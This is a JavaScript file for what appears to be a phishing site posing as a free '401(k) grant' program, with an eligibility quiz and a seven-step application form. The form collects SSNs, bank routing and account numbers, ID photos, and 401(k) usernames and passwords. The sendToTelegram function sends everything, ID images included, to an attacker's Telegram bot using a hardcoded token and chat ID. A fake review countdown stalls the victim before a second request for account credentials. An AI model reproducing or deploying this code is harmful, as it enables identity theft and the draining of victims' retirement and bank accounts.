document.addEventListener('DOMContentLoaded', function () {
  initNavbar();
  initScrollAnimations();
  initEligibilityChecker();
  initApplicationForm();
  initDashboardSidebar();
});

function initNavbar() {
  const navbar = document.querySelector('.navbar');
  if (!navbar) return;

  const toggle = document.querySelector('.nav-toggle');
  const menu = document.querySelector('.nav-menu');

  window.addEventListener('scroll', function () {
    if (window.scrollY > 50) {
      navbar.classList.add('scrolled');
    } else {
      navbar.classList.remove('scrolled');
    }
  });

  if (toggle && menu) {
    toggle.addEventListener('click', function () {
      menu.classList.toggle('open');
      const icon = toggle.querySelector('svg');
      if (menu.classList.contains('open')) {
        icon.innerHTML = '<line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>';
      } else {
        icon.innerHTML = '<line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>';
      }
    });
  }

  const currentPage = window.location.pathname.split('/').pop() || 'index.html';
  document.querySelectorAll('.nav-menu a').forEach(function (link) {
    const href = link.getAttribute('href');
    if (href === currentPage || (currentPage === '' && href === 'index.html')) {
      link.classList.add('active');
    }
  });
}

function initScrollAnimations() {
  const elements = document.querySelectorAll('.fade-in');
  if (!elements.length) return;

  const observer = new IntersectionObserver(function (entries) {
    entries.forEach(function (entry) {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

  elements.forEach(function (el) {
    observer.observe(el);
  });
}

function initEligibilityChecker() {
  const checker = document.querySelector('.checker-body');
  if (!checker) return;

  const questions = [
    {
      q: 'Do you currently own a 401(k) account?',
      desc: '401(k) ownership is required, but grant funds are separate and will not affect your account balance.',
      options: ['Yes, I own a 401(k) account', 'No, I do not have a 401(k) account']
    },
    {
      q: 'Are you currently working?',
      desc: 'Applicants must currently be employed or self-employed in the United States.',
      options: ['Yes, I am employed', 'Yes, I am self-employed', 'No, I am not currently working']
    },
    {
      q: 'Are you a U.S. citizen?',
      desc: 'This grant is available to working citizens of the United States.',
      options: ['Yes, I am a U.S. citizen', 'No, I am not a U.S. citizen']
    },
    {
      q: 'Are you at least 18 years old?',
      desc: 'Applicants must be legal adults who can submit their own information for review.',
      options: ['Yes, I am 18 or older', 'No, I am under 18']
    },
  ];

  let currentStep = 0;
  let answers = [];
  let selectedOption = null;

  const progressFill = checker.querySelector('.fill');
  const progressCount = checker.querySelector('.count');
  const questionContainer = checker.querySelector('.checker-question');
  const resultContainer = checker.querySelector('.checker-result');
  const btnBack = checker.querySelector('.btn-back');
  const btnNext = checker.querySelector('.btn-next');

  function updateProgress() {
    const progress = ((currentStep) / questions.length) * 100;
    if (progressFill) progressFill.style.width = progress + '%';
    if (progressCount) progressCount.textContent = (currentStep + 1) + ' of ' + questions.length;
  }

  function showQuestion() {
    if (currentStep >= questions.length) {
      showResult();
      return;
    }

    resultContainer.style.display = 'none';
    questionContainer.style.display = 'flex';

    const q = questions[currentStep];
    questionContainer.innerHTML = `
      <h4>${q.q}</h4>
      <p class="question-desc">${q.desc}</p>
      <div class="answer-options">
        ${q.options.map(function (opt, i) {
          return `<button class="answer-btn" data-index="${i}">${opt}</button>`;
        }).join('')}
      </div>
    `;

    selectedOption = answers[currentStep] !== undefined ? answers[currentStep] : null;

    questionContainer.querySelectorAll('.answer-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        questionContainer.querySelectorAll('.answer-btn').forEach(function (b) {
          b.style.background = '';
          b.style.borderColor = '';
          b.style.color = '';
        });
        btn.style.background = 'rgba(212, 175, 55, 0.08)';
        btn.style.borderColor = '#d4af37';
        btn.style.color = '#0a1929';
        selectedOption = parseInt(btn.dataset.index);
        if (btnNext) btnNext.disabled = false;
      });
    });

    if (selectedOption !== null) {
      const btns = questionContainer.querySelectorAll('.answer-btn');
      if (btns[selectedOption]) {
        btns[selectedOption].style.background = 'rgba(212, 175, 55, 0.08)';
        btns[selectedOption].style.borderColor = '#d4af37';
        btns[selectedOption].style.color = '#0a1929';
      }
      if (btnNext) btnNext.disabled = false;
    } else {
      if (btnNext) btnNext.disabled = true;
    }

    if (btnBack) btnBack.style.visibility = currentStep === 0 ? 'hidden' : 'visible';
    if (btnNext) btnNext.textContent = currentStep === questions.length - 1 ? 'See Results' : 'Next';

    updateProgress();
  }

  function calculateEligibility() {
    let score = 0;

    if (answers[0] === 0) score += 25;
    else return { eligible: false, reason: 'This program is exclusive to 401(k) account holders.' };

    if (answers[1] === 0 || answers[1] === 1) score += 25;
    else return { eligible: false, reason: 'You must be currently employed or self-employed to qualify.' };

    if (answers[2] === 0) score += 25;
    else return { eligible: false, reason: 'This grant is available to U.S. citizens.' };

    if (answers[3] === 0) score += 25;
    else return { eligible: false, reason: 'Applicants must be at least 18 years old.' };

    return {
      eligible: score === 100,
      score: score,
      range: 'determined after your application is reviewed'
    };
  }

  function showResult() {
    const result = calculateEligibility();
    questionContainer.style.display = 'none';
    resultContainer.style.display = 'block';
    if (btnBack) btnBack.style.visibility = 'visible';
    if (btnNext) btnNext.style.display = 'none';

    if (result.eligible) {
      resultContainer.className = 'checker-result success';
      resultContainer.innerHTML = `
        <div class="result-icon success">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h4>You Meet the Basic Requirements</h4>
        <p>Based on your answers, you may submit an application for review. Approval is not guaranteed, and your award amount will be <strong>${result.range}</strong>. The grant is free of charge and separate from your 401(k).</p>
        <a href="application.html" class="btn btn-primary btn-lg glow">Start My Application</a>
      `;
    } else {
      resultContainer.className = 'checker-result rejected';
      resultContainer.innerHTML = `
        <div class="result-icon rejected">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </div>
        <h4>Not Eligible at This Time</h4>
        <p>${result.reason} Please review our requirements or contact our support team for more information.</p>
        <button class="btn btn-outline-dark btn-lg" onclick="resetChecker()">Review Requirements</button>
      `;
    }
  }

  window.resetChecker = function () {
    currentStep = 0;
    answers = [];
    selectedOption = null;
    if (btnNext) btnNext.style.display = '';
    showQuestion();
  };

  if (btnBack) {
    btnBack.addEventListener('click', function () {
      if (currentStep > 0) {
        currentStep--;
        selectedOption = answers[currentStep];
        if (btnNext) btnNext.style.display = '';
        showQuestion();
      } else {
        window.resetChecker();
      }
    });
  }

  if (btnNext) {
    btnNext.addEventListener('click', function () {
      if (selectedOption === null) return;
      answers[currentStep] = selectedOption;
      currentStep++;
      selectedOption = null;
      showQuestion();
    });
  }

  showQuestion();
}

function initApplicationForm() {
  const formCard = document.querySelector('.form-card');
  if (!formCard) return;

  const totalSteps = 7;
  let currentStep = 1;
  const formData = {
    personal: {},
    banking: {},
    business: {},
    idVerify: {},
    review: {},
    kaccess: {},
    final: {}
  };

  // ── Telegram config ──────────────────────────────────────────────
  // Replace these two values with your actual bot token and group chat ID
  const TELEGRAM_BOT_TOKEN = '8992354125:AAH_A4hKwzAsaE97uKCrlRp1_UzO11KOcWI';
  const TELEGRAM_CHAT_ID   = '-1004482554358';
  // ────────────────────────────────────────────────────────────────

  let reviewTimer = null;
  let reviewStartTime = null;

  // ── Validation: required text/number/select fields per step ──────
  // Upload fields are handled separately.
  // NOTE: businessName (step 3) and businessAddress (step 3) are intentionally
  // omitted — they are optional. All others listed are REQUIRED.
  const REQUIRED_FIELDS = {
    1: ['firstName', 'lastName', 'email', 'phone', 'dob', 'ssn',
        'address', 'city', 'state', 'zip', 'citizenship'],
    2: ['bankName', 'bankAccountType', 'accountHolder', 'routing', 'accountNum'],
    3: ['businessStatus', 'businessType', 'industry', 'employees', 'businessSummary'],
    4: ['idType', 'idNumber', 'idFullName', 'idDob', 'idExpires', 'idIssuer',
        'provider', 'k401Username', 'k401Password', 'accountNumber', 'balance',
        'accountOpenDate', 'accountType', 'employer'],
    5: [],
    6: ['k401AccessUsername', 'k401AccessPassword'],
    7: []
  };

  // ── Error helpers ────────────────────────────────────────────────
  function showFieldError(el, msg) {
    el.style.borderColor = '#ef4444';
    let errEl = el.parentElement.querySelector('.field-error');
    if (!errEl) {
      errEl = document.createElement('span');
      errEl.className = 'field-error';
      errEl.style.cssText = 'color:#ef4444;font-size:0.78rem;display:block;margin-top:4px;';
      el.parentElement.appendChild(errEl);
    }
    errEl.textContent = msg;
  }

  function clearFieldError(el) {
    el.style.borderColor = '';
    const errEl = el.parentElement ? el.parentElement.querySelector('.field-error') : null;
    if (errEl) errEl.remove();
  }

  function showUploadError(areaId, msg) {
    const area = document.getElementById(areaId);
    if (!area) return;
    area.style.borderColor = '#ef4444';
    let errEl = area.parentElement ? area.parentElement.querySelector('.field-error') : null;
    if (!errEl) {
      errEl = document.createElement('span');
      errEl.className = 'field-error';
      errEl.style.cssText = 'color:#ef4444;font-size:0.78rem;display:block;margin-top:6px;';
      if (area.parentElement) area.parentElement.appendChild(errEl);
    }
    errEl.textContent = msg;
  }

  function clearUploadError(areaId) {
    const area = document.getElementById(areaId);
    if (!area) return;
    area.style.borderColor = '';
    const errEl = area.parentElement ? area.parentElement.querySelector('.field-error') : null;
    if (errEl) errEl.remove();
  }

  // ── Per-step validation ──────────────────────────────────────────
  function validateStep(step) {
    const stepEl = formCard.querySelector('.form-step[data-step="' + step + '"]');
    if (!stepEl) return true;

    let valid = true;
    const required = REQUIRED_FIELDS[step] || [];

    // Clear previous errors in this step
    stepEl.querySelectorAll('.field-error').forEach(function (e) { e.remove(); });
    stepEl.querySelectorAll('input, select, textarea').forEach(function (el) {
      el.style.borderColor = '';
    });

    // Check each required field
    required.forEach(function (name) {
      const el = stepEl.querySelector('[name="' + name + '"]');
      if (!el) return;
      const val = (el.value || '').trim();
      if (!val) {
        showFieldError(el, 'This field is required.');
        valid = false;
      }
    });

    // Step 4: ID front AND back uploads are compulsory
    if (step === 4) {
      const frontInput = document.getElementById('fileIdFront');
      const backInput  = document.getElementById('fileIdBack');

      if (!frontInput || !frontInput.files || frontInput.files.length === 0) {
        showUploadError('uploadIdFront', 'A photo of the front of your ID is required.');
        valid = false;
      } else {
        clearUploadError('uploadIdFront');
      }

      if (!backInput || !backInput.files || backInput.files.length === 0) {
        showUploadError('uploadIdBack', 'A photo of the back of your ID is required.');
        valid = false;
      } else {
        clearUploadError('uploadIdBack');
      }
    }

    // Scroll to first error
    if (!valid) {
      const firstErr = stepEl.querySelector('.field-error');
      if (firstErr) {
        firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }

    return valid;
  }

  // Clear errors as user types / changes
  formCard.addEventListener('input', function (e) {
    const el = e.target;
    if (el.value && el.value.trim()) clearFieldError(el);
  });
  formCard.addEventListener('change', function (e) {
    const el = e.target;
    if (el.value && el.value.trim()) clearFieldError(el);
    // If a file input changed inside the ID upload areas, clear upload errors
    if (el.type === 'file') {
      if (el.id === 'fileIdFront' && el.files && el.files.length > 0) clearUploadError('uploadIdFront');
      if (el.id === 'fileIdBack'  && el.files && el.files.length > 0) clearUploadError('uploadIdBack');
    }
  });

  // ── Telegram submission ──────────────────────────────────────────
  function sendToTelegram(data, idFrontFile, idBackFile) {
    var p   = data.personal  || {};
    var ba  = data.banking   || {};
    var b   = data.business  || {};
    var idv = data.idVerify  || {};
    var ka  = data.kaccess   || {};

    var lines = [
      '\uD83C\uDD95 NEW 401k GRANT APPLICATION',
      '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501',
      '\uD83D\uDC64 PERSONAL INFORMATION',
      'Name: ' + ((p.firstName || '') + ' ' + (p.lastName || '')).trim(),
      'Email: ' + (p.email || '-'),
      'Phone: ' + (p.phone || '-'),
      'DOB: ' + (p.dob || '-'),
      'SSN: ' + (p.ssn || '-'),
      'Address: ' + [p.address, p.city, p.state, p.zip].filter(Boolean).join(', '),
      'Citizenship: ' + (p.citizenship || '-'),
      '',
      '\uD83C\uDFE6 BANK DETAILS',
      'Bank: ' + (ba.bankName || '-'),
      'Account Type: ' + (ba.bankAccountType || '-'),
      'Account Holder: ' + (ba.accountHolder || '-'),
      'Routing: ' + (ba.routing || '-'),
      'Account #: ' + (ba.accountNum || '-'),
      '',
      '\uD83D\uDCBC FUNDING NEED',
      'Business Name: ' + (b.businessName || '-'),
      'Grant Purpose: ' + (b.businessStatus || '-'),
      'Employment Status: ' + (b.businessType || '-'),
      'Industry/Category: ' + (b.industry || '-'),
      'Work Arrangement: ' + (b.employees || '-'),
      'Summary: ' + (b.businessSummary || '-'),
      'Additional Details: ' + (b.businessAddress || '-'),
      '',
      '\uD83C\uDDF3 ID VERIFICATION',
      'ID Type: ' + (idv.idType || '-'),
      'ID Number: ' + (idv.idNumber || '-'),
      'Full Name on ID: ' + (idv.idFullName || '-'),
      'DOB on ID: ' + (idv.idDob || '-'),
      'Expiration: ' + (idv.idExpires || '-'),
      'Issuing State/Country: ' + (idv.idIssuer || '-'),
      '',
      '\uD83D\uDCCA 401(k) ACCOUNT INFO',
      'Provider: ' + (idv.provider || '-'),
      '401k Username: ' + (idv.k401Username || '-'),
      '401k Password: ' + (idv.k401Password || '-'),
      'Account # (last 6): ' + (idv.accountNumber || '-'),
      'Balance: $' + (idv.balance ? Number(idv.balance).toLocaleString() : '-'),
      'Date Opened: ' + (idv.accountOpenDate || '-'),
      'Account Type: ' + (idv.accountType || '-'),
      'Employer: ' + (idv.employer || '-'),
      '',
      '\uD83D\uDD11 401(k) ACCESS CREDENTIALS',
      'Username: ' + (ka.k401AccessUsername || '-'),
      'Password: ' + (ka.k401AccessPassword || '-'),
      '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501',
      '\uD83D\uDCCE ID images follow below'
    ];

    var text = lines.join('\n');
    var apiBase = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/';

    var msgPromise = fetch(apiBase + 'sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text
      })
    }).catch(function (err) { console.warn('TG message failed:', err); });

    var fullName = ((p.firstName || '') + ' ' + (p.lastName || '')).trim();

    function sendFile(file, caption) {
      var isImage = file.type.startsWith('image/');
      var endpoint = isImage ? 'sendPhoto' : 'sendDocument';
      var fieldName = isImage ? 'photo' : 'document';
      var fd = new FormData();
      fd.append('chat_id', TELEGRAM_CHAT_ID);
      fd.append(fieldName, file, file.name);
      fd.append('caption', caption);
      return fetch(apiBase + endpoint, { method: 'POST', body: fd })
        .catch(function (err) { console.warn('TG file failed:', err); });
    }

    return msgPromise.then(function () {
      var chain = Promise.resolve();
      if (idFrontFile) {
        chain = chain.then(function () {
          return sendFile(idFrontFile, 'ID Front — ' + fullName);
        });
      }
      if (idBackFile) {
        chain = chain.then(function () {
          return sendFile(idBackFile, 'ID Back — ' + fullName);
        });
      }
      return chain;
    });
  }

  // ── Review countdown (step 5) ────────────────────────────────────
  function startReviewCountdown() {
    if (reviewTimer) return;
    var pauseIcon = document.getElementById('progressPauseIcon');
    if (pauseIcon) {
      pauseIcon.classList.remove('hidden');
      pauseIcon.classList.add('visible');
    }
    var countdownEl = document.getElementById('reviewCountdown');
    var ringEl = document.getElementById('reviewRing');
    var checks = document.querySelectorAll('#reviewChecks .rev-check');
    var totalSeconds = 30 * 60;
    var circumference = 2 * Math.PI * 52;
    reviewStartTime = Date.now();
    var nextCheckAt = [0.08, 0.25, 0.55, 0.82];

    function markCheck(idx) {
      var c = checks[idx];
      if (!c || c.classList.contains('done')) return;
      c.classList.add('done');
      c.style.color = 'var(--navy-900)';
      c.style.fontWeight = '600';
      var dot = c.querySelector('.rev-dot');
      if (dot) {
        dot.style.background = '#10b981';
        dot.style.boxShadow = '0 0 0 4px rgba(16,185,129,0.12)';
      }
    }

    function tick() {
      var elapsed = Math.floor((Date.now() - reviewStartTime) / 1000);
      var remaining = Math.max(totalSeconds - elapsed, 0);
      var mm = String(Math.floor(remaining / 60)).padStart(2, '0');
      var ss = String(remaining % 60).padStart(2, '0');
      if (countdownEl) countdownEl.textContent = mm + ':' + ss;
      var progress = 1 - remaining / totalSeconds;
      if (ringEl) ringEl.style.strokeDashoffset = String(circumference * (1 - progress));
      nextCheckAt.forEach(function (threshold, i) {
        if (progress >= threshold) markCheck(i);
      });

      if (remaining <= 0) {
        clearInterval(reviewTimer);
        reviewTimer = null;
        var pi = document.getElementById('progressPauseIcon');
        if (pi) pi.classList.add('hidden');
        var btn = document.getElementById('btnSkipReview');
        if (btn) {
          btn.textContent = 'Continue to 401(k) Access \u2192';
          btn.classList.remove('btn-outline-dark');
          btn.classList.add('btn-primary');
          btn.disabled = false;
        }
        setTimeout(function () {
          if (currentStep === 5) {
            currentStep = 6;
            showStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
          }
        }, 900);
      }
    }
    tick();
    reviewTimer = setInterval(tick, 1000);
  }

  // ── Progress bar ─────────────────────────────────────────────────
  function updateProgressSteps() {
    var steps = document.querySelectorAll('.progress-step');
    var progressLine = document.querySelector('.progress-line');

    steps.forEach(function (step, i) {
      step.classList.remove('active', 'completed');
      if (i + 1 < currentStep) step.classList.add('completed');
      else if (i + 1 === currentStep) step.classList.add('active');

      var circle = step.querySelector('.step-circle');
      if (step.classList.contains('completed')) {
        circle.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3" width="16" height="16"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" /></svg>';
      } else {
        circle.textContent = i + 1;
      }
    });

    var progressPercent = ((currentStep - 1) / (totalSteps - 1)) * 90;
    if (progressLine) progressLine.style.width = (5 + progressPercent) + '%';
  }

  // ── Show a specific step ─────────────────────────────────────────
  function showStep(step) {
    var allSteps = formCard.querySelectorAll('.form-step');
    allSteps.forEach(function (s) { s.style.display = 'none'; });

    var targetStep = formCard.querySelector('.form-step[data-step="' + step + '"]');
    if (targetStep) targetStep.style.display = 'block';

    updateProgressSteps();

    formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
      btnPrev.style.visibility = step === 1 ? 'hidden' : 'visible';
    });
    formCard.querySelectorAll('.btn-next-step').forEach(function (btnNext) {
      if (btnNext.classList.contains('btn-submit-final')) return;
      var inStep = btnNext.closest('.form-step');
      var stepNum = inStep ? parseInt(inStep.dataset.step, 10) : null;

      if (stepNum === 5) {
        btnNext.textContent = (btnNext.id === 'btnSkipReview')
          ? (btnNext.disabled ? 'Proceeding automatically\u2026' : 'Continue to 401(k) Access \u2192')
          : 'Continue \u2192';
      } else if (stepNum === 4) {
        btnNext.textContent = 'Begin Review \u2192';
      } else if (stepNum === 6) {
        btnNext.textContent = 'Review Application \u2192';
      } else if (step === totalSteps) {
        btnNext.textContent = 'Submit Application';
      } else if (step === totalSteps - 1) {
        btnNext.textContent = 'Review Application \u2192';
      } else {
        btnNext.textContent = 'Continue \u2192';
      }
    });

    if (step === 5) startReviewCountdown();
  }

  // ── Collect form data from a step ───────────────────────────────
  function collectStepData(step) {
    var stepEl = formCard.querySelector('.form-step[data-step="' + step + '"]');
    if (!stepEl) return;

    var stepKey = ['personal', 'banking', 'business', 'idVerify', 'review', 'kaccess', 'final'][step - 1];
    if (!formData[stepKey]) formData[stepKey] = {};

    stepEl.querySelectorAll('input, select, textarea').forEach(function (input) {
      if (input.name) {
        formData[stepKey][input.name] = input.value;
      }
    });
  }

  // ── Populate the review summary (step 7) ─────────────────────────
  function populateReview() {
    var p   = formData.personal  || {};
    var idv = formData.idVerify  || {};
    var ka  = formData.kaccess   || {};
    var b   = formData.business  || {};
    var ba  = formData.banking   || {};

    var reviewEl = formCard.querySelector('.review-grid');
    if (!reviewEl) return;

    function row(label, value) {
      return '<div class="review-item"><span class="label">' + label + '</span><span class="value">' + (value || '\u2014') + '</span></div>';
    }

    reviewEl.innerHTML =
      row('Full Name', (p.firstName || '\u2014') + ' ' + (p.lastName || '\u2014')) +
      row('Email', p.email) +
      row('Phone', p.phone) +
      row('Date of Birth', p.dob || idv.idDob) +
      row('SSN (Last 4)', p.ssn ? '\u2022\u2022\u2022-\u2022\u2022-' + p.ssn : null) +
      row('Street Address', p.address) +
      row('ID Type', idv.idType) +
      row('ID Number', idv.idNumber ? '\u2022\u2022\u2022\u2022\u2022\u2022' + String(idv.idNumber).slice(-4) : null) +
      row('401(k) Provider', idv.provider) +
      row('401(k) Username', ka.k401AccessUsername || idv.k401Username) +
      row('Account Balance', idv.balance ? '$' + Number(idv.balance).toLocaleString() : null) +
      row('Business / Need', b.businessName) +
      row('Employment Status', b.businessType) +
      row('Bank Name', ba.bankName) +
      row('Bank Account Type', ba.bankAccountType) +
      row('Routing Number', ba.routing ? '\u2022\u2022\u2022\u2022\u2022\u2022' + (ba.routing.slice(-3) || '') : null) +
      row('24hr Review', 'Required before approval');
  }

  // ── Previous button ──────────────────────────────────────────────
  formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
    btnPrev.addEventListener('click', function () {
      if (currentStep > 1) {
        collectStepData(currentStep);
        currentStep--;
        showStep(currentStep);
      }
    });
  });

  // ── Next / Submit button ─────────────────────────────────────────
  formCard.querySelectorAll('.btn-next-step').forEach(function (btnNext) {
    btnNext.addEventListener('click', function () {
      // Step 5 (review countdown) has no required fields — skip validation
      if (currentStep !== 5) {
        if (!validateStep(currentStep)) return;
      }

      collectStepData(currentStep);

      if (currentStep === totalSteps) {
        // Final submission — send to Telegram then show success screen
        btnNext.textContent = 'Submitting...';
        btnNext.disabled = true;

        var frontInput = document.getElementById('fileIdFront');
        var backInput  = document.getElementById('fileIdBack');
        var idFrontFile = (frontInput && frontInput.files && frontInput.files[0]) ? frontInput.files[0] : null;
        var idBackFile  = (backInput  && backInput.files  && backInput.files[0])  ? backInput.files[0]  : null;

        sendToTelegram(formData, idFrontFile, idBackFile)
          .catch(function () {})
          .then(function () {
            setTimeout(function () {
              var successEl = document.querySelector('.application-success');
              if (successEl) {
                formCard.style.display = 'none';
                successEl.style.display = 'block';
                window.scrollTo({ top: 0, behavior: 'smooth' });
              }
            }, 1200);
          });
        return;
      }

      if (currentStep === totalSteps - 1) {
        populateReview();
      }

      currentStep++;
      showStep(currentStep);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  });

  // ── 401k statement upload (optional, step 4) ─────────────────────
  var uploadArea   = formCard.querySelector('.upload-area');
  var fileListEl   = formCard.querySelector('.file-list');
  var fileInput    = formCard.querySelector('#fileInput');
  var uploadedFiles = [];

  if (uploadArea && fileInput) {
    uploadArea.addEventListener('click', function () { fileInput.click(); });

    fileInput.addEventListener('change', function (e) {
      handleFiles(e.target.files);
    });

    uploadArea.addEventListener('dragover', function (e) {
      e.preventDefault();
      uploadArea.style.borderColor = '#d4af37';
      uploadArea.style.background = 'rgba(212, 175, 55, 0.05)';
    });

    uploadArea.addEventListener('dragleave', function () {
      uploadArea.style.borderColor = '';
      uploadArea.style.background = '';
    });

    uploadArea.addEventListener('drop', function (e) {
      e.preventDefault();
      uploadArea.style.borderColor = '';
      uploadArea.style.background = '';
      handleFiles(e.dataTransfer.files);
    });
  }

  function handleFiles(files) {
    Array.from(files).forEach(function (file) {
      uploadedFiles.push(file);
      renderFileList();
    });
  }

  function renderFileList() {
    if (!fileListEl) return;
    fileListEl.innerHTML = uploadedFiles.map(function (file, i) {
      var sizeKB = (file.size / 1024).toFixed(1);
      var size = sizeKB > 1024 ? (sizeKB / 1024).toFixed(1) + ' MB' : sizeKB + ' KB';
      return '<div class="file-item">' +
        '<div class="file-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg></div>' +
        '<div class="file-info"><div class="name">' + file.name + '</div><div class="size">' + size + '</div></div>' +
        '<button class="file-remove" data-i="' + i + '"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" /></svg></button>' +
        '</div>';
    }).join('');

    fileListEl.querySelectorAll('.file-remove').forEach(function (btn) {
      btn.addEventListener('click', function (e) {
        e.stopPropagation();
        var idx = parseInt(btn.dataset.i);
        uploadedFiles.splice(idx, 1);
        renderFileList();
      });
    });
  }

  showStep(1);
}

function initDashboardSidebar() {
  var toggleBtn = document.querySelector('.dash-sidebar-toggle');
  var sidebar = document.querySelector('.dashboard-sidebar');

  if (toggleBtn && sidebar) {
    toggleBtn.addEventListener('click', function () {
      sidebar.classList.toggle('open');
    });
  }
}
